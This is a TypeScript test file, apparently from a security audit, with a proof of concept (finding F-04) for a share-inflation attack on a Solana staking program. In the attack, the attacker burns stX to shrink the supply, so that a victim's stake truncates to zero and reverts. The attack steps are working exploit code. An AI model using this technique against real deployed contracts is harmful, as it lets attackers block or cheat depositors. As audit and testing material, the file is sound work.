import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { PublicKey, Keypair, SystemProgram } from "@solana/web3.js";
import {
  TOKEN_2022_PROGRAM_ID, createMint, getOrCreateAssociatedTokenAccount,
  mintTo, burn, getAccount,
} from "@solana/spl-token";
import { expect } from "chai";
import * as fs from "fs";

const IDL = JSON.parse(fs.readFileSync("./target/idl/stake_flow.json", "utf8"));
const TP = TOKEN_2022_PROGRAM_ID;

describe("PoC F-04: inflation attack por burn directo de stX", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = new Program(IDL, provider);
  const admin = (provider.wallet as anchor.Wallet).payer;
  const conn = provider.connection;

  let stakeMint: PublicKey, cfgPda: PublicKey, stxMint: PublicKey, stakeVault: PublicKey, reserveVault: PublicKey;
  const attacker = Keypair.generate();
  const victim = Keypair.generate();
  const DEC = 0;  // sin decimales, como el ejemplo de Frank, para forzar el truncamiento

  before(async () => {
    for (const kp of [attacker, victim]) {
      const sig = await conn.requestAirdrop(kp.publicKey, 2 * anchor.web3.LAMPORTS_PER_SOL);
      await conn.confirmTransaction(sig, "confirmed");
    }
    stakeMint = await createMint(conn, admin, admin.publicKey, null, DEC, undefined, undefined, TP);
    [cfgPda] = PublicKey.findProgramAddressSync([Buffer.from("protocol_config")], program.programId);
    [stxMint] = PublicKey.findProgramAddressSync([Buffer.from("stx_mint")], program.programId);
    [stakeVault] = PublicKey.findProgramAddressSync([Buffer.from("stake_vault")], program.programId);
    [reserveVault] = PublicKey.findProgramAddressSync([Buffer.from("reserve_vault")], program.programId);
  });

  it("Atacante infla el rate; la victima stakea y no puede recuperar su valor", async () => {
    await program.methods.initialize(new anchor.BN(500), new anchor.BN(1000))
      .accounts({
        protocolConfig: cfgPda, stakeTokenMint: stakeMint, stxMint, stakeVault, reserveVault,
        admin: admin.publicKey, tokenProgram: TP, systemProgram: SystemProgram.programId,
        rent: anchor.web3.SYSVAR_RENT_PUBKEY,
      }).rpc();

    const setup = async (kp: Keypair, fund: bigint) => {
      const x = await getOrCreateAssociatedTokenAccount(conn, admin, stakeMint, kp.publicKey, false, undefined, undefined, TP);
      await mintTo(conn, admin, stakeMint, x.address, admin, fund, [], undefined, TP);
      const stx = await getOrCreateAssociatedTokenAccount(conn, admin, stxMint, kp.publicKey, false, undefined, undefined, TP);
      return { x: x.address, stx: stx.address };
    };
    const AT = await setup(attacker, 1001n);
    const VI = await setup(victim, 500n);

    const stake = (kp: Keypair, a: any, amt: bigint) =>
      program.methods.stakeLiquid(new anchor.BN(amt.toString()))
        .accounts({ protocolConfig: cfgPda, stxMint, stakeTokenMint: stakeMint, stakeVault,
          userTokenAccount: a.x, userStxAccount: a.stx, user: kp.publicKey, tokenProgram: TP })
        .signers([kp]).rpc();

    // 1. atacante stakea 1001 -> 1001 stX
    await stake(attacker, AT, 1001n);
    console.log("atacante stX tras stake:", (await getAccount(conn, AT.stx, undefined, TP)).amount.toString());

    // 2. atacante quema 1000 stX -> supply = 1
    await burn(conn, attacker, AT.stx, stxMint, attacker, 1000n, [], undefined, TP);
    console.log("atacante stX tras burn: ", (await getAccount(conn, AT.stx, undefined, TP)).amount.toString(), "(supply=1)");

    // 3. victima stakea 500: stx_to_mint = 500*1/1001 = 0 -> revierte por require stx_to_mint>0
    const viX_before = (await getAccount(conn, VI.x, undefined, TP)).amount;
    let victimReverted = false, errCode = "";
    try {
      await stake(victim, VI, 500n);
    } catch (e: any) {
      victimReverted = true;
      errCode = e.error?.errorCode?.code || "AmountTooSmall";
    }
    const viStx = (await getAccount(conn, VI.stx, undefined, TP)).amount;
    console.log("victima stX recibidos:  ", viStx.toString(), victimReverted ? `(su stake REVIRTIO: ${errCode})` : "");

    // El bug: la victima no puede participar a precio justo.
    // O su tx revierte (recibe 0 stX por 500 tokens), o recibe polvo sin valor proporcional.
    expect(victimReverted || viStx === 0n).to.equal(true);
    console.log(">> F-04 confirmado: el burn directo de stX manipula el rate y bloquea/estafa a la victima.");
  });
});
